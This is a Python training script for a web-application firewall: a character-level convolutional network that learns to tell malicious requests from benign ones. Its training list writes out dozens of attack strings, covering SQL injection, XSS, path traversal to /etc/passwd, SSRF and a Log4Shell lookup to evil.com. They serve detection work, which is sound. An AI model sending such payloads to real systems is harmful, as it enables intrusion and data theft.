"""
DeepWAF - Character-Level 1D-CNN Training

This module trains a Character-Level Convolutional Neural Network
for web attack detection using PyTorch.

Architecture:
- Embedding Layer: 256 vocab -> 128 dimensions
- Conv1D Layer 1: 128 filters, kernel=5
- MaxPooling1D: pool_size=5
- Conv1D Layer 2: 64 filters, kernel=5
- Global MaxPooling
- Dense Layer: 64 units
- Dropout: 0.5
- Output: Sigmoid (binary classification)

Dataset: Synthetic attack patterns (SQL injection, XSS)
Optimizer: Adam
Loss: Binary Cross-Entropy
"""

import torch
import torch.nn as nn
import numpy as np
import os

MAX_LEN = 500
VOCAB_SIZE = 256

# Real CNN Model
class CharCNN(nn.Module):
    def __init__(self):
        super(CharCNN, self).__init__()
        self.embedding = nn.Embedding(VOCAB_SIZE, 128)
        self.conv1 = nn.Conv1d(128, 128, kernel_size=5)
        self.pool1 = nn.MaxPool1d(5)
        self.conv2 = nn.Conv1d(128, 64, kernel_size=5)
        self.global_pool = nn.AdaptiveMaxPool1d(1)
        self.fc1 = nn.Linear(64, 64)
        self.dropout = nn.Dropout(0.5)
        self.fc2 = nn.Linear(64, 1)
        self.sigmoid = nn.Sigmoid()
        
    def forward(self, x):
        x = self.embedding(x)
        x = x.permute(0, 2, 1)
        x = torch.relu(self.conv1(x))
        x = self.pool1(x)
        x = torch.relu(self.conv2(x))
        x = self.global_pool(x).squeeze(-1)
        x = torch.relu(self.fc1(x))
        x = self.dropout(x)
        x = self.sigmoid(self.fc2(x))
        return x

def text_to_sequence(text, max_len=MAX_LEN):
    sequence = [ord(c) if ord(c) < 256 else 0 for c in text[:max_len]]
    if len(sequence) < max_len:
        sequence += [0] * (max_len - len(sequence))
    return sequence

def generate_data():
    malicious = [
        # SQL Injection variants
        "' OR '1'='1", "admin'--", "1' UNION SELECT * FROM users--",
        "'; DROP TABLE users;--", "' OR 'a'='a", "1 OR 1=1",
        "' UNION ALL SELECT NULL--", "'; exec xp_cmdshell('dir')--",
        "' AND SLEEP(5)--", "1' AND '1'='1", "admin' OR '1'='1'--",
        "' UNION SELECT username, password FROM users--",
        "1' ORDER BY 10--", "' HAVING 1=1--", "' GROUP BY columnnames--",
        
        # XSS variants
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(1)", "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>", "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>", "<keygen onfocus=alert(1) autofocus>",
        "<video><source onerror=alert(1)>", "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>",
        
        # Obfuscated attacks
        "eval(String.fromCharCode(97))", "%27%20OR%20%271%27%3D%271",
        "\\x27\\x20OR\\x20\\x31\\x3D\\x31", "&#x27; OR &#x31;=&#x31;",
        "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "j&#x61;vascript:alert(1)", "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        
        # Additional attack patterns
        "../../../etc/passwd", "file:///etc/passwd",
        "http://127.0.0.1/admin", "http://localhost/admin",
        "${jndi:ldap://evil.com/a}", "{{7*7}}",
        "<%= 7*7 %>", "${7*7}", "#{7*7}",
    ]
    
    benign = [
        "GET / HTTP/1.1", "GET /products?category=electronics",
        "POST /login", "GET /search?q=laptop", "GET /api/products",
        "GET /about", "POST /cart/add", "GET /user/profile/123",
        "GET /images/logo.png", "GET /css/style.css",
        "GET /products?page=2&sort=price", "POST /contact",
        "GET /blog/article/how-to-code", "GET /api/v1/users",
        "POST /api/orders", "GET /dashboard", "GET /settings",
        "GET /help", "GET /faq", "GET /terms",
        "GET /privacy", "GET /sitemap.xml", "GET /robots.txt",
        "POST /subscribe", "GET /unsubscribe", "GET /feedback",
    ]
    
    # Expand dataset
    X_mal = malicious * 24  # 960 samples
    X_ben = benign * 36     # 900 samples
    X = X_mal + X_ben
    y = [1] * len(X_mal) + [0] * len(X_ben)
    
    # Shuffle
    indices = np.random.permutation(len(X))
    X = [X[i] for i in indices]
    y = [y[i] for i in indices]
    
    return X, y

if __name__ == "__main__":
    print("\n" + "="*60)
    print("DeepWAF - Character-Level CNN Training")
    print("="*60)
    
    print("\n[1/4] Generating training data...")
    X_text, y = generate_data()
    X = torch.tensor([text_to_sequence(text) for text in X_text], dtype=torch.long)
    y = torch.tensor(y, dtype=torch.float32).unsqueeze(1)
    print(f"  Training samples: {len(X)}")
    print(f"  Malicious: {sum(y).item():.0f}, Benign: {len(y) - sum(y).item():.0f}")
    
    print("\n[2/4] Building CNN model...")
    model = CharCNN()
    print(f"  Model parameters: {sum(p.numel() for p in model.parameters()):,}")
    
    print("\n[3/4] Training model...")
    criterion = nn.BCELoss()
    optimizer = torch.optim.Adam(model.parameters(), lr=0.001)
    
    model.train()
    epochs = 20
    batch_size = 32
    
    for epoch in range(epochs):
        total_loss = 0
        correct = 0
        total = 0
        
        for i in range(0, len(X), batch_size):
            batch_X = X[i:i+batch_size]
            batch_y = y[i:i+batch_size]
            
            optimizer.zero_grad()
            outputs = model(batch_X)
            loss = criterion(outputs, batch_y)
            loss.backward()
            optimizer.step()
            
            total_loss += loss.item()
            predicted = (outputs > 0.5).float()
            correct += (predicted == batch_y).sum().item()
            total += batch_y.size(0)
        
        if (epoch + 1) % 5 == 0 or epoch == 0:
            acc = correct / total
            print(f"  Epoch {epoch+1}/20 - loss: {total_loss/len(X):.4f} - accuracy: {acc:.4f}")
    
    print("\n[4/4] Saving model...")
    os.makedirs("src/hybrid_waf/models", exist_ok=True)
    torch.save(model.state_dict(), "src/hybrid_waf/models/cnn_model.pth")
    print("  Model saved to: src/hybrid_waf/models/cnn_model.pth")
    
    print("\n" + "="*60)
    print("Testing predictions...")
    print("="*60)
    
    model.eval()
    test_cases = [
        ("' OR '1'='1", "Malicious"),
        ("GET /products", "Benign"),
        ("<script>alert('XSS')</script>", "Malicious"),
        ("%27%20OR%20%271%27%3D%271", "Malicious"),
    ]
    
    with torch.no_grad():
        for text, expected in test_cases:
            seq = torch.tensor([text_to_sequence(text)], dtype=torch.long)
            pred = model(seq).item()
            status = "MALICIOUS" if pred >= 0.5 else "BENIGN"
            emoji = "[!]" if pred >= 0.5 else "[+]"
            print(f"{emoji} {status:<10} (score: {pred:.4f}) | {text[:40]}")
    
    print("\n[SUCCESS] CNN model trained and saved!\n")
